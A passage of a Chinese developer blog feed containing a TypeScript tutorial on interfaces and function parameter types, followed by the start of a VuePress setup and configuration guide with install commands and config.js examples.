punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">}</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    order<span class="token punctuation">:</span> <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token string">'test'</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用[params: string]定义了属性取string类型的值；</p><p>注意：一旦定义了任意属性，那么之前定义的确定属性和可选属性都必须是他的子集；</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Property 'name' of type 'string' is not assignable to string index type 'object'.</span><span class="token comment" spellcheck="true">//Property 'age' of type 'number' is not assignable to string index type 'object'.</span><span class="token keyword">interface</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span>string<span class="token punctuation">;</span>    age<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span> string<span class="token punctuation">]</span><span class="token punctuation">:</span> object<span class="token punctuation">}</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    order<span class="token punctuation">:</span> <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token string">'test'</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="只读属性"><a href="#只读属性" class="headerlink" title="只读属性"></a>只读属性</h3><p>有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 <code>readonly</code> 定义只读属性：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    readonly id<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    name<span class="token punctuation">:</span>string<span class="token punctuation">;</span>    age<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token punctuation">[</span>params<span class="token punctuation">:</span> string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">}</span><span class="token keyword">let</span> myJson<span class="token punctuation">:</span> Person <span class="token operator">=</span> <span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    order<span class="token punctuation">:</span> <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token string">'test'</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//Cannot assign to 'id' because it is a read-only property.</span>myJson<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token number">345</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>readonly和const</p><p>最简单判断该用<code>readonly</code>还是<code>const</code>的方法是看要把它做为变量使用还是做为一个属性。 做为变量使用的话用<code>const</code>，若做为属性则使用<code>readonly</code>。</p><h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><p>在 JavaScript 中，有两种常见的定义函数的方式——函数声明（Function Declaration）和函数表达式（Function Expression）</p><h3 id="用接口定义函数的形状"><a href="#用接口定义函数的形状" class="headerlink" title="用接口定义函数的形状"></a>用接口定义函数的形状</h3><p>使用接口的方式来定义一个函数需要符合的形状：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">SearchFunc</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>source<span class="token punctuation">:</span> string<span class="token punctuation">,</span> subStr<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> mySearch<span class="token punctuation">:</span> SearchFunc <span class="token operator">=</span> <span class="token punctuation">(</span>source<span class="token punctuation">:</span>string<span class="token punctuation">,</span> subStr<span class="token punctuation">:</span>string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> source<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>subStr<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="有可选参数的函数"><a href="#有可选参数的函数" class="headerlink" title="有可选参数的函数"></a>有可选参数的函数</h3><p>与JavaScript不同，调用函数时传的参数的数量或者类型不符合函数中定义的参数要求是，TypeScript编译器会报错；如：</p><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">,</span>bar<span class="token punctuation">:</span>number<span class="token punctuation">,</span>foobar<span class="token punctuation">:</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span>foobar<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//提供的参数不匹配函数的签名</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//提供的参数不匹配函数的签名</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 返回<span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在一些场景下我们不需要传所有的参数；TypeScript一个函数可选参数的特性；</p><p>在TypeScript中通过在函数参数后面追加一个?，指定参数是可选的</p><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">,</span>bar<span class="token punctuation">:</span>number<span class="token punctuation">,</span>foobar<span class="token operator">?</span><span class="token punctuation">:</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span>foobar<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//提供的参数不匹配函数的签名</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>返回<span class="token number">3</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 返回<span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="有默认参数的函数"><a href="#有默认参数的函数" class="headerlink" title="有默认参数的函数"></a>有默认参数的函数</h3><p>当函数有可选参数时，我们必须检测参数是否被传递了 如：</p><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">,</span>bar<span class="token punctuation">:</span>number<span class="token punctuation">,</span>foobar<span class="token operator">?</span><span class="token punctuation">:</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span><span class="token punctuation">(</span>foobar <span class="token operator">!==</span> undefined <span class="token operator">?</span> foobar <span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样来做并没有错，但是可以通过提供foobar的参数的默认值，来替代标记其为可选参数，以改善可读性</p><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">,</span>bar<span class="token punctuation">:</span>number<span class="token punctuation">,</span>foobar<span class="token punctuation">:</span>number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span>foobar<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在声明函数签名时使用=提供一个默认值，即可指定函数参数是可选的；TypeScript编译会在JavaScript输出结果中生成一个if结构，在foobar参数没有传递函数时设置一个默认值；</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>foo<span class="token punctuation">,</span> bar<span class="token punctuation">,</span> foobar<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>foobar <span class="token operator">===</span> <span class="token keyword">void</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        foobar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span>foobar<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>void 0是TypeScript编译器检测一个变量是否为undefined的用法；</p><h3 id="有剩余参数的函数"><a href="#有剩余参数的函数" class="headerlink" title="有剩余参数的函数"></a>有剩余参数的函数</h3><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">,</span>bar<span class="token punctuation">:</span>number<span class="token punctuation">,</span>foobar<span class="token punctuation">:</span>number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> foo<span class="token operator">+</span>bar<span class="token operator">+</span>foobar<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果想调用add传递更多个参数该如何解决呢？</p><p>使用剩余参数，剩余参数语法允许把不限量的参数表示为一个数组</p><pre class="line-numbers language-js"><code class="language-js">add <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">...</span>foo<span class="token punctuation">:</span>number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> foo<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">+</span><span class="token operator">=</span> foo<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span>用<span class="token operator">...</span>foo替换了参数foo、bar、foobar；一个剩余参数必须包含一个数组类型，否则会出现编译错误；<span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//return 0</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//return 1</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//return 15</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuepress从零开始</title>
      <link href="2019/09/03/vuepress/"/>
      <url>2019/09/03/vuepress/</url>
      
        <content type="html"><![CDATA[<h2 id="VuePress"><a href="#VuePress" class="headerlink" title="VuePress"></a>VuePress</h2><p>VuePress 由两部分组成：一个以 Vue 驱动的主题系统的简约静态网站生成工具，和一个为编写技术文档而优化的默认主题。它是为了支持 Vue 子项目的文档需求而创建的。</p><p>由 VuePress 生成的每个页面，都具有相应的预渲染静态 HTML，它们能提供出色的加载性能，并且对 SEO 友好。然而，页面加载之后，Vue 就会将这些静态内容，接管为完整的单页面应用程序(SPA)。当用户在浏览站点时，可以按需加载其他页面。</p><p><a href="http://caibaojian.com/vuepress/guide/" target="_blank" rel="noopener">VuePress中文网</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Node.js版本需要&gt;=8才可以。</p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>g vuepress 或者在已有项目中安装npm install vuepress <span class="token operator">-</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装完成检测是否安装成功</p><pre class="line-numbers language-js"><code class="language-js">vuepress <span class="token operator">-</span>v<span class="token comment" spellcheck="true">//vuepress v1.0.3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他信息：</p><pre class="line-numbers language-js"><code class="language-js">vuepress v1<span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">3</span>Usage<span class="token punctuation">:</span>  $ vuepress <span class="token operator">&lt;</span>command<span class="token operator">></span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Commands<span class="token punctuation">:</span>  dev <span class="token punctuation">[</span>targetDir<span class="token punctuation">]</span>    start development server  build <span class="token punctuation">[</span>targetDir<span class="token punctuation">]</span>  build dir <span class="token keyword">as</span> <span class="token keyword">static</span> site  eject <span class="token punctuation">[</span>targetDir<span class="token punctuation">]</span>  copy the <span class="token keyword">default</span> theme into <span class="token punctuation">.</span>vuepress<span class="token operator">/</span>theme <span class="token keyword">for</span> customization<span class="token punctuation">.</span>  info               Shows debugging information about the local environmentFor more info<span class="token punctuation">,</span> run any command <span class="token keyword">with</span> the <span class="token template-string"><span class="token string">`--help`</span></span> flag<span class="token punctuation">:</span>  $ vuepress dev <span class="token operator">--</span>help  $ vuepress build <span class="token operator">--</span>help  $ vuepress eject <span class="token operator">--</span>help  $ vuepress info <span class="token operator">--</span>helpOptions<span class="token punctuation">:</span>  <span class="token operator">-</span>v<span class="token punctuation">,</span> <span class="token operator">--</span>version  Display version number   <span class="token operator">-</span>h<span class="token punctuation">,</span> <span class="token operator">--</span>help     Display <span class="token keyword">this</span> message <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre class="line-numbers language-js"><code class="language-js">mkdir VuePresscd VuePress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>通过npm init快速创建项目的pageage.json文件</p><pre class="line-numbers language-js"><code class="language-js">npm init <span class="token operator">-</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"VuePress"</span><span class="token punctuation">,</span>  <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token string">"main"</span><span class="token punctuation">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span>  <span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"test"</span><span class="token punctuation">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"keywords"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token string">"license"</span><span class="token punctuation">:</span> <span class="token string">"ISC"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建docs文件夹"><a href="#新建docs文件夹" class="headerlink" title="新建docs文件夹"></a>新建docs文件夹</h3><p>docs文件夹作为项目文档根目录，主要放置Markdown类型的文章和.vuepress文件夹。</p><pre class="line-numbers language-js"><code class="language-js">mkdir docs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置package-json"><a href="#设置package-json" class="headerlink" title="设置package.json"></a>设置package.json</h3><p>在script中添加dev启动和build打包脚本命令</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"test"</span><span class="token punctuation">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="token punctuation">,</span>    <span class="token string">"dev"</span><span class="token punctuation">:</span> <span class="token string">"vuepress dev docs"</span><span class="token punctuation">,</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"vuepress build docs"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建README-md"><a href="#创建README-md" class="headerlink" title="创建README.md"></a>创建README.md</h3><p>在docs里面创建README.md</p><pre class="line-numbers language-js"><code class="language-js">cd docsecho <span class="token string">"## Hello VuePress"</span> <span class="token operator">></span> README<span class="token punctuation">.</span>md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="创建-vuepress目录"><a href="#创建-vuepress目录" class="headerlink" title="创建.vuepress目录"></a>创建.vuepress目录</h3><pre class="line-numbers language-js"><code class="language-js">npm run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可直接打包构建README.md文件 并生成.vuepress</p><p> <code>.vuepress</code> 目录这是放置所有 VuePress 特有(VuePress-specific) 文件的地方。</p><h3 id="创建config-js"><a href="#创建config-js" class="headerlink" title="创建config.js"></a>创建config.js</h3><p>不做任何配置的话，页面会显得过于简单，用户也无法方便地浏览网站；</p><p>配置 VuePress 站点的基本文件是 <code>.vuepress/config.js</code>，其中导出一个 JavaScript 对象：</p><pre class="line-numbers language-js"><code class="language-js">touch config<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><pre class="line-numbers language-js"><code class="language-js">├── docs # 文档目录│    ├── <span class="token punctuation">.</span>vuepress <span class="token comment" spellcheck="true">//存放所有资源和打包结果</span>│   │         ├── dist <span class="token comment" spellcheck="true">//打包结果</span>│   │        ├── <span class="token keyword">public</span> <span class="token comment" spellcheck="true">//公共资源文件</span>│   │        ├── <span class="token operator">...</span>│   │       └── config<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">//配置文件</span>│   ├── demo <span class="token comment" spellcheck="true">//分类文档存储</span>│   │    ├── demo1<span class="token punctuation">.</span>md│   │    ├── <span class="token operator">...</span>│   │    └── demon<span class="token punctuation">.</span>md│   └── README<span class="token punctuation">.</span>md └── <span class="token keyword">package</span><span class="token punctuation">.</span>json<span class="token comment" spellcheck="true">//项目启动配置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'文档管理'</span><span class="token punctuation">,</span>     description<span class="token punctuation">:</span> <span class="token string">'呵呵博客'</span><span class="token punctuation">,</span>    head<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> rel<span class="token punctuation">:</span> <span class="token string">'icon'</span><span class="token punctuation">,</span> href<span class="token punctuation">:</span> <span class="token string">'/logo.ico'</span> <span class="token punctuation">}</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="title"><a href="#title" class="headerlink" title="title"></a>title</h3><ul><li>Type: <code>string</code></li><li>Default: <code>undefined</code></li></ul><p>网站的标题。这将是所有页面标题的前缀，并显示在默认主题的导航栏中。</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul><li>Type: <code>string</code></li><li>Default: <code>undefined</code></li></ul><p>网站描述。这将在页面 HTML 中表现为一个 <code>&lt;meta&gt;</code> 标签。</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><ul><li>Type: <code>Array</code></li><li>Default: <code>[]</code></li></ul><p>被注入页面 HTML <code>&lt;head&gt;</code> 额外的标签。每个标签可以用 <code>[tagName, { attrName: attrValue }, innerHTML?]</code> 的形式指定。例如，要添加自定义图标：</p><h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><ul><li>Type: <code>number</code></li><li>Default: <code>8080</code></li></ul><p>指定用于 dev 服务器的端口。</p><h3 id="dest"><a href="#dest" class="headerlink" title="dest"></a>dest</h3><ul><li>Type: <code>string</code></li><li>Default: <code>.vuepress/dist</code></li></ul><p>指定 <code>vuepress build</code> 的输出目录。</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp1.png" alt></p><h2 id="导航配置"><a href="#导航配置" class="headerlink" title="导航配置"></a>导航配置</h2><h3 id="配置代码"><a href="#配置代码" class="headerlink" title="配置代码"></a>配置代码</h3><p>你可以通过 <code>themeConfig.nav</code> 将链接添加到导航栏中：</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    themeConfig<span class="token punctuation">:</span> <span class="token punctuation">{</span>        nav<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'主页'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'测试'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/test/test.md'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'百度'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'https://www.baidu.com'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以添加远程连接 如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'百度'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'https://www.baidu.com'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以添加本地文件：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'测试'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/test/test.md'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp2.png" alt>  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp3.png" alt></p><h2 id="侧边栏配置"><a href="#侧边栏配置" class="headerlink" title="侧边栏配置"></a>侧边栏配置</h2><h3 id="基本配置-1"><a href="#基本配置-1" class="headerlink" title="基本配置"></a>基本配置</h3><p>你可以省略 <code>.md</code> 扩展名，以 <code>/</code> 结尾的路径被推断为 <code>*/README.md</code> 。该链接的文本是自动推断的（从页面的第一个标题或 <code>YAML front matter</code> 中的显式标题）。如果你希望明确指定链接文本，请使用 <code>[link,text]</code> 形式的数组。</p><pre class="line-numbers language-js"><code class="language-js">themeConfig<span class="token punctuation">:</span> <span class="token punctuation">{</span>    sidebar<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'简介'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'/cst/cst.md'</span><span class="token punctuation">,</span> <span class="token string">'车商通'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'/new/index1.md'</span><span class="token punctuation">,</span> <span class="token string">'发布新框架'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'/feedback/feedback.md'</span><span class="token punctuation">,</span> <span class="token string">'问题反馈'</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：文件命名不要用index关键字</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp5.png" alt></p><h3 id="侧边栏组配置"><a href="#侧边栏组配置" class="headerlink" title="侧边栏组配置"></a>侧边栏组配置</h3><p>使用对象将侧边栏链接分成多个组：</p><pre class="line-numbers language-js"><code class="language-js">themeConfig<span class="token punctuation">:</span> <span class="token punctuation">{</span>    sidebar<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">[</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'简介'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            title<span class="token punctuation">:</span> <span class="token string">"车商通"</span><span class="token punctuation">,</span>            collapsable<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            children<span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token punctuation">[</span><span class="token string">'/cst/cst.md'</span><span class="token punctuation">,</span> <span class="token string">'车商通'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token string">'/cst/draft.md'</span><span class="token punctuation">,</span> <span class="token string">'草稿箱'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token string">'/cst/esc.md'</span><span class="token punctuation">,</span> <span class="token string">'二手车'</span><span class="token punctuation">]</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            title<span class="token punctuation">:</span> <span class="token string">"新框架"</span><span class="token punctuation">,</span>            